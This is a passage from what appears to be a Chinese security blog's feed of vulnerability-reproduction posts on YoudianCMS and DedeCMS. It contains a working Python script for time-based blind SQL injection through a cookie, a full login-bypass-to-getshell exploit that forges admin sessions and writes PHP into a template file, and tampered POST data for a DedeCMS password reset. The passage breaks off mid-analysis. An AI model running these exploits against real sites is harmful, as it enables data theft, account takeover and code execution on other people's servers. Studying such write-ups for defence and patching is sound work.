href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">baseurl, payload</span>):</span></span><br><span class="line">    url = baseurl + <span class="string">&quot;/index.php/Channel/voteAdd&quot;</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;pn9iofrfklen68u4205veml8s0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;youdianAdminLangSet&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;youdianfu[0]&quot;</span>: <span class="string">&quot;exp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;youdianfu[1]&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    starttime = time.time()</span><br><span class="line">    s.get(url, cookies=cookies)</span><br><span class="line">    endtime = time.time()</span><br><span class="line">    <span class="keyword">if</span> endtime - starttime &gt;= <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span>(<span class="params">baseurl</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        payload = <span class="string">&quot;=(select 1 from(select if(length(database())=&#123;0&#125;,sleep(3),0))a)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> check(baseurl, payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] database len: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span>(<span class="params">baseurl, length</span>):</span></span><br><span class="line">    stringset = string.digits + string.ascii_letters</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> stringset:</span><br><span class="line">            payload = <span class="string">&quot;=(select 1 from(select if(ascii(substr(database(), &#123;0&#125;, 1))=&#123;1&#125;,sleep(3),0))a)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i + <span class="number">1</span>), <span class="built_in">str</span>(<span class="built_in">ord</span>(j)))</span><br><span class="line">            <span class="keyword">if</span> check(baseurl, payload):</span><br><span class="line">                database += <span class="built_in">str</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + database)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/youdiancms9.0&#x27;</span></span><br><span class="line">    length = getLength(url)</span><br><span class="line">    getDatabase(url, length)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210702202939.png"></p><h2 id="一些其他可注入的点"><a href="#一些其他可注入的点" class="headerlink" title="一些其他可注入的点"></a>一些其他可注入的点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;Wap&#x2F;Channel&#x2F;voteAdd</span><br></pre></td></tr></table></figure><p>还有一些其他的，都是需要微信访问的，这个只要满足使用 <code>$this-&gt;_fromUser</code> 且最后进入了 where 方法的，几乎都可以被注入，因此这里挺多地方都是可以注入的</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞就是满足了两点，一是使用了已知的存在漏洞的框架，二是存在可控的变量，这也为我们代码审计提供了一些思路，可以多找找控制 <code>COOKIE</code> 的地方，这方面的防护相较于 <code>GET</code> <code>POST</code> 更为薄弱一些，然后就是多积累一些框架漏洞，不知道什么时候就使用到了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://forum.butian.net/share/132">https://forum.butian.net/share/132</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 友点cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>友点CMS V9.1 后台登录绕过 GetShell</title>
      <link href="2021/06/29/%E5%8F%8B%E7%82%B9CMS-V9-1-%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87-GetShell/"/>
      <url>2021/06/29/%E5%8F%8B%E7%82%B9CMS-V9-1-%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87-GetShell/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>友点 CMS V9.1 后台登录绕过 GetShell ，攻击者可无需任意权限即可登录后台并 getshell</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>youdiancms &lt;=9.1</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><ul><li>验证码可设置session</li><li>session(AdminGroupID==1) 超级管理员</li><li>后台模板修改代码执行</li></ul><h3 id="任意-session-获取"><a href="#任意-session-获取" class="headerlink" title="任意 session 获取"></a>任意 session 获取</h3><p>站在前人的肩膀上，看到 App/Lib/Action/BaseAction.class.php ，217 行 verifyCode 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyCode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];        <span class="comment">//长度</span></span><br><span class="line">    <span class="variable">$mode</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>];          <span class="comment">//模式</span></span><br><span class="line">    <span class="variable">$type</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>];              <span class="comment">//图像类型</span></span><br><span class="line">    <span class="variable">$width</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;width&#x27;</span>];           <span class="comment">//宽度</span></span><br><span class="line">    <span class="variable">$height</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;height&#x27;</span>];        <span class="comment">//高度</span></span><br><span class="line">    <span class="variable">$verifyName</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;verify&#x27;</span>];  <span class="comment">//验证码session名称</span></span><br><span class="line">    import(<span class="string">&quot;ORG.Util.Image&quot;</span>);</span><br><span class="line">    Image::buildImageVerify(<span class="variable">$length</span>, <span class="variable">$mode</span>, <span class="variable">$type</span>, <span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$verifyName</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个生成验证码的函数，可以看到，这些参数都是可控的，进入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Image::buildImageVerify(<span class="variable">$length</span>, <span class="variable">$mode</span>, <span class="variable">$type</span>, <span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$verifyName</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">buildImageVerify</span>(<span class="params"><span class="variable">$length</span>=<span class="number">4</span>, <span class="variable">$mode</span>=<span class="number">1</span>, <span class="variable">$type</span>=<span class="string">&#x27;png&#x27;</span>, <span class="variable">$width</span>=<span class="number">48</span>, <span class="variable">$height</span>=<span class="number">22</span>, <span class="variable">$verifyName</span>=<span class="string">&#x27;verify&#x27;</span></span>) </span>&#123;</span><br><span class="line">    import(<span class="string">&#x27;ORG.Util.StringEx&#x27;</span>);</span><br><span class="line">    <span class="variable">$randval</span> = StringEx::randString(<span class="variable">$length</span>, <span class="variable">$mode</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$verifyName</span>] = md5(<span class="variable">$randval</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>看到这句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$verifyName</span>] = md5(<span class="variable">$randval</span>);</span><br></pre></td></tr></table></figure><p><code>$verifyName</code> 是可控的，也就是说我们可以控制 <code>$_SESSION</code> 的键，后面的 md5 值暂时不考虑</p><p>接下来我们找可以利用的地方，我们看到管理员登陆的地方 App/Lib/Action/AdminBaseAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_initialize</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$mName</span> = strtolower(ACTION_NAME);</span><br><span class="line">    <span class="variable">$NoCheckAction</span> = <span class="keyword">array</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;verify&#x27;</span>,<span class="string">&#x27;checklogin&#x27;</span>,<span class="string">&#x27;showcode&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>); <span class="comment">//免登录验证模块</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;isLogin() &amp;&amp; !in_array(<span class="variable">$mName</span>, <span class="variable">$NoCheckAction</span>))&#123; <span class="comment">//没有登录，将返回登录页面</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect(<span class="string">&quot;Public/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;checkPurview() )&#123; <span class="comment">//没有登录，将返回网站首页</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect(<span class="string">&quot;Public/welcome&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是初始化的位置，需要注意两个地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;isLogin()</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkPurview()</span><br></pre></td></tr></table></figure><p>想要得到登陆的状态，就需要绕过这两个方法，先来看 <code>$this-&gt;isLogin()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$b</span> = session(<span class="string">&quot;?AdminID&quot;</span>) &amp;&amp; session(<span class="string">&quot;?AdminName&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很简单，只要存在 AdminID 和 AdminName 这两个session就可以，我们之前找到的地方就可以赋值</p><p>再来看 <code>$this-&gt;checkPurview()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPurview</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$gid</span> = session(<span class="string">&#x27;AdminGroupID&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$gid</span> == <span class="number">1</span> ) <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//超级管理员拥有所有权限</span></span><br></pre></td></tr></table></figure><p>这里首先要有一个 session AdminGroupID，这个容易满足，也可以直接赋值，但是只能获得普通的登陆权限，想要获得超级管理员的权限，就需要 <code>$gid == 1</code> ，看似没有办法完成，但是注意到这里是弱比较，而之前赋值的时候，是用的 md5 值，我们只需要得到一个 md5，满足第一个字符是 1 ，第二个字符不是数字，就可以完成</p><p>回到一开始的漏洞位置，我们看看如何生成 md5 值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import(<span class="string">&#x27;ORG.Util.StringEx&#x27;</span>);</span><br><span class="line"><span class="variable">$randval</span> = StringEx::randString(<span class="variable">$length</span>, <span class="variable">$mode</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$verifyName</span>] = md5(<span class="variable">$randval</span>);</span><br></pre></td></tr></table></figure><p>我们看到这里应该是生成的随机字符串，传入的 <code>$length</code> 和 <code>$mode</code>  是我们可控的，进入该函数</p><p>App/Core/Extend/Library/ORG/Util/StringEx.class.php 的 128 行 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">randString</span>(<span class="params"><span class="variable">$len</span>=<span class="number">6</span>,<span class="variable">$type</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$addChars</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$str</span> =<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="variable">$chars</span>=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>.<span class="variable">$addChars</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$chars</span>= str_repeat(<span class="string">&#x27;0123456789&#x27;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$chars</span>=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>.<span class="variable">$addChars</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="variable">$chars</span>=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>.<span class="variable">$addChars</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="variable">$chars</span> = <span class="string">&quot;们以我到...&quot;</span>.<span class="variable">$addChars</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span> :</span><br><span class="line">            <span class="comment">// 默认去掉了容易混淆的字符oOLl和数字01，要添加请使用addChars参数</span></span><br><span class="line">            <span class="variable">$chars</span>=<span class="string">&#x27;ABCDEFGHIJKMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789&#x27;</span>.<span class="variable">$addChars</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span>&gt;<span class="number">10</span> ) &#123;<span class="comment">//位数过长重复字符串一定次数</span></span><br><span class="line">        <span class="variable">$chars</span>= <span class="variable">$type</span>==<span class="number">1</span>? str_repeat(<span class="variable">$chars</span>,<span class="variable">$len</span>) : str_repeat(<span class="variable">$chars</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span>!=<span class="number">4</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span>   =   str_shuffle(<span class="variable">$chars</span>);</span><br><span class="line">        <span class="variable">$str</span>     =   substr(<span class="variable">$chars</span>,<span class="number">0</span>,<span class="variable">$len</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 中文随机字</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">          <span class="variable">$str</span>.= <span class="built_in">self</span>::msubstr(<span class="variable">$chars</span>, floor(mt_rand(<span class="number">0</span>,mb_strlen(<span class="variable">$chars</span>,<span class="string">&#x27;utf-8&#x27;</span>)-<span class="number">1</span>)),<span class="number">1</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里是利用 <code>$type</code> 选择相应的字符串，然后用 <code>$len</code>  控制长度，最后生成字符串</p><p>满足条件的 md5 值，1 - 100 以内就有 3个 ，为了减少爆破的次数，我们就直接选择数字以及长度设置成两位</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>后台 getshell 可以利用修改模板</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210629220227.png"></p><p>App/Lib/Action/Admin/TemplateAction.class.php 的 68 行 saveModify 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveModify</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="variable">$ThemeName</span> = C(<span class="string">&#x27;HOME_DEFAULT_THEME&#x27;</span>);</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;FileName&#x27;</span>] = YdInput::checkFileName( <span class="variable">$_POST</span>[<span class="string">&#x27;FileName&#x27;</span>] );</span><br><span class="line">    <span class="variable">$FullFileName</span> = TMPL_PATH.<span class="string">&#x27;Home/&#x27;</span>.<span class="variable">$ThemeName</span>.<span class="string">&#x27;/&#x27;</span>.ltrim(<span class="variable">$_POST</span>[<span class="string">&#x27;FileName&#x27;</span>],<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;isValidTplFile(<span class="variable">$FullFileName</span>))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="literal">null</span>, <span class="string">&#x27;无效模板文件!&#x27;</span> , <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实体解码</span></span><br><span class="line">    <span class="variable">$FileContent</span> = htmlspecialchars_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;FileContent&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">        <span class="variable">$FileContent</span> = stripslashes(<span class="variable">$FileContent</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$b</span> = file_put_contents(<span class="variable">$FullFileName</span>, <span class="variable">$FileContent</span>);</span><br></pre></td></tr></table></figure><p>首先获取文件名，然后将 post 上来的 content 写入模板文件，过程较为简单</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url1 = url + <span class="string">&quot;/index.php?a=verifyCode&amp;verify=AdminID&quot;</span></span><br><span class="line">        url2 = url + <span class="string">&quot;/index.php?a=verifyCode&amp;verify=AdminName&quot;</span></span><br><span class="line">        url3 = url + <span class="string">&quot;/index.php?a=verifyCode&amp;verify=AdminGroupID&amp;length=2&amp;mode=1&quot;</span></span><br><span class="line">        adminurl = url + <span class="string">&quot;/index.php/Admin/Public/AdminLeft/MenuTopID/7&quot;</span></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(url1)</span><br><span class="line">        <span class="built_in">print</span>(s.cookies)</span><br><span class="line">        s.get(url2)</span><br><span class="line">        s.get(url3)</span><br><span class="line">        html = s.get(adminurl).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;模板&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">            editurl = url + <span class="string">&#x27;/index.php/Admin/template/saveModify&#x27;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;FileName&#x27;</span>: <span class="string">&#x27;/Public/header.html&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;FileContent&#x27;</span>: <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s.post(editurl, data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot;/index.php/&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/youdiancms9.0&#x27;</span></span><br><span class="line">    run(url)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>测试版本为 9.0，很多文章中写的利用短标签绕过过滤来getshell，这里没有必要，就没有去用，应该是 9.1 才有的过滤，这个前面的绕过漏洞是很有意思的，后面的后台 getshell 写的有点草率，尤其是exp中，直接覆盖了整个模板文件，真实的渗透测试中还是不要这么干，毕竟会影响到正常的业务了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://forum.butian.net/share/132">https://forum.butian.net/share/132</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 友点cms </tag>
            
            <tag> 登录绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 前台任意用户密码修改漏洞</title>
      <link href="2021/06/28/DedeCMS-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/06/28/DedeCMS-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。在用户密码重置功能处，php  存在弱类型比较，如果用户没有设置密保问题，那么可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是 member 表中的密码，即使修改了管理员密码也是 member 表中的管理员密码，仍是无法进入管理。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p><p>开启会员功能</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>需要管理员开启会员功能，开启流程为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统 -&gt; 系统基本参数 -&gt; 会员设置</span><br></pre></td></tr></table></figure><p>然后进入找回密码，选择 “通过安全问题找回”，填写正确的用户名与邮箱</p><p>没有密码问题的用户，会得到这样的提示</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210628212228.png"></p><p>不要紧，重来并用burp 抓包，更改 post 数据</p><p>原本的 post 数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost&#x3D;getpwd&amp;gourl&#x3D;&amp;userid&#x3D;ada&amp;mail&#x3D;123456%40admin.com&amp;vdcode&#x3D;vogr&amp;type&#x3D;1</span><br></pre></td></tr></table></figure><p>更改后的 post 数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost&#x3D;safequestion&amp;id&#x3D;2&amp;safequestion&#x3D;00&amp;safeanswer&#x3D;0</span><br></pre></td></tr></table></figure><p>id 为 想要更改的用户账号 id，发包即可</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210628212956.png"></p><p>访问得到的链接，就可以修改密码</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>来到 member/resetpassword.php</p><p>根据漏洞复现中更改的 post 的数据来看，实际上将 dopost 的值改了，这样就实现了直接从 getpwd 步骤跳到了 safequestion，我们直接来到 safequestion ，在 75 到 93 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mid</span> = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span 